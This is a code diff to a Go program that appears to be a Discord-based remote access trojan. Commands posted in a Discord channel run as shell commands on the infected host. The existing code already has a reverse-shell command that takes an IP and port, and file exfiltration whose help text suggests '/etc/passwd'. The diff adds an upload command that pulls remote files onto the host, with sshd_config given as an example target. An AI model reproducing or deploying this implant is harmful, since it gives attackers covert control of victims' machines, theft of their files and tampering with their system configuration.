@@ -7,6 +7,7 @@ import (
 	"os"
 	"os/exec"
 	"os/signal"
+	"regexp"
 	"runtime"
 	"strings"
 	"syscall"
@@ -41,7 +42,7 @@ func init() {
 }
 
 func main() {
-	//TODO Do a check on the constant and produce a good error
+	// TODO Do a check on the constant and produce a good error
 	dg, err := discordgo.New("Bot " + util.BotToken)
 	if err != nil {
 		fmt.Println("error creating Discord session,", err)
@@ -95,6 +96,8 @@ func main() {
 
 // This function is where we define custom commands for discordgo and system commands for the target
 func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
+	var re = regexp.MustCompile(`(?m)<@&\d{18}>`)
+
 	// Special case
 	if message.Author.Bot {
 		if message.Content == "kill" {
@@ -105,34 +108,35 @@ func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 
 	// Another special case
 	if len(message.MentionRoles) > 0 {
-		// PUT THIS IS A FUNCTION
-		println(message.Content)
+		message_content := strings.Trim(re.ReplaceAllString(message.Content, ""), " ")
+		// PUT THIS IS A FUNCTION\
 		if message.ChannelID == channelID.ID {
-			output := executeCommand(message.Content)
-				if output == "" {
-					dg.ChannelMessageSend(message.ChannelID, "Command didn't return anything")
-				} else {
-					batch := ""
-					counter := 0
-					largeOutputChunck := []string{}
-					for char := 0; char < len(output); char++ {
-						if counter < 2000  && char < len(output) - 1 {
+			fmt.Println(message_content)
+			output := executeCommand(message_content)
+			if output == "" {
+				dg.ChannelMessageSend(message.ChannelID, "Command didn't return anything")
+			} else {
+				batch := ""
+				counter := 0
+				largeOutputChunck := []string{}
+				for char := 0; char < len(output); char++ {
+					if counter < 2000 && char < len(output)-1 {
+						batch += string(output[char])
+						counter++
+					} else {
+						if char == len(output)-1 {
 							batch += string(output[char])
-							counter ++
-						} else {
-							if (char == len(output) - 1){
-								batch += string(output[char])
-							}
-							largeOutputChunck = append(largeOutputChunck, batch)
-							batch = string(output[char])
-      						counter = 1
 						}
-					}
-
-					for _, chunck := range largeOutputChunck {
-						dg.ChannelMessageSend(message.ChannelID, "```" + chunck + "```")
+						largeOutputChunck = append(largeOutputChunck, batch)
+						batch = string(output[char])
+						counter = 1
 					}
 				}
+
+				for _, chunck := range largeOutputChunck {
+					dg.ChannelMessageSend(message.ChannelID, "```"+chunck+"```")
+				}
+			}
 		}
 	}
 
@@ -143,11 +147,11 @@ func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 			} else if message.Content == "kill" {
 				dg.ChannelDelete(channelID.ID)
 				os.Exit(0)
-			} else if strings.Contains(message.Content, "cd") {
+			} else if strings.HasPrefix(message.Content, "cd") {
 				commandBreakdown := strings.Fields(message.Content)
 				os.Chdir(commandBreakdown[1])
 				dg.ChannelMessageSend(message.ChannelID, "```Directory changed to "+commandBreakdown[1]+"```")
-			} else if strings.Contains(message.Content, "shell") && !strings.Contains(message.Content, "powershell") {
+			} else if strings.HasPrefix(message.Content, "shell") {
 				splitCommand := strings.Fields(message.Content)
 				if len(splitCommand) == 1 {
 					dg.ChannelMessageSend(message.ChannelID, "``` shell <type> <ip> <port> \n Example: shell bash 127.0.0.1 1337, shell sh 127.0.0.1 69696\n Shell type: bash and sh```")
@@ -177,14 +181,14 @@ func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 						sh.Stdin, sh.Stdout, sh.Stderr = conn, conn, conn
 						sh.Run()
 						conn.Close()
-						
+
 					} else {
 						dg.ChannelMessageSend(message.ChannelID, "```Not a supported shell type```")
 					}
 				} else {
 					dg.ChannelMessageSend(message.ChannelID, "``` Incomplete command ```")
 				}
-			} else if strings.Contains(message.Content, "download") {
+			} else if strings.HasPrefix(message.Content, "download") {
 				commandBreakdown := strings.Fields(message.Content)
 				if len(commandBreakdown) == 1 {
 					dg.ChannelMessageSend(message.ChannelID, "Please specify file(s): download /etc/passwd")
@@ -199,6 +203,21 @@ func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 						dg.ChannelFileSend(message.ChannelID, file, bufio.NewReader(fileReader))
 					}
 				}
+			} else if strings.HasPrefix(message.Content, "upload") {
+				commandBreakdown := strings.Split(message.Content, " ")
+				if len(commandBreakdown) == 1 {
+					dg.ChannelMessageSend(message.ChannelID, "Please specify the file: upload /etc/ssh/sshd_config(with attached file) or upload http://example.com/test.txt /tmp/test.txt")
+					return
+				} else if len(commandBreakdown) == 2 { // upload /etc/ssh/sshd_config(with attached file)
+					fileDownloadPath := commandBreakdown[1]
+					if len(message.Attachments) == 0 { // With out this, the program will crash, can be used for debugging
+						dg.ChannelMessageSend(message.ChannelID, "No file was attached!")
+						return
+					}
+					util.DownloadFile(fileDownloadPath, message.Attachments[0].URL)
+				} else { // upload http://example.com/test.txt /tmp/test.txt
+					util.DownloadFile(commandBreakdown[2], commandBreakdown[1])
+				}
 			} else {
 				output := executeCommand(message.Content)
 				if output == "" {
@@ -208,21 +227,21 @@ func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 					counter := 0
 					largeOutputChunck := []string{}
 					for char := 0; char < len(output); char++ {
-						if counter < 2000  && char < len(output) - 1 {
+						if counter < 2000 && char < len(output)-1 {
 							batch += string(output[char])
-							counter ++
+							counter++
 						} else {
-							if (char == len(output) - 1){
+							if char == len(output)-1 {
 								batch += string(output[char])
 							}
 							largeOutputChunck = append(largeOutputChunck, batch)
 							batch = string(output[char])
-      						counter = 1
+							counter = 1
 						}
 					}
 
 					for _, chunck := range largeOutputChunck {
-						dg.ChannelMessageSend(message.ChannelID, "```" + chunck + "```")
+						dg.ChannelMessageSend(message.ChannelID, "```"+chunck+"```")
 					}
 				}
 			}
@@ -278,7 +297,7 @@ func executeCommand(command string) string {
 	} else {
 		output, err := exec.Command(shell, flag, testcmd).Output()
 		if err != nil {
-			// maybe send error to server
+			// maybe send error to server ??? nah
 			fmt.Println(err.Error())
 			fmt.Println("Couldn't execute command")
 		}
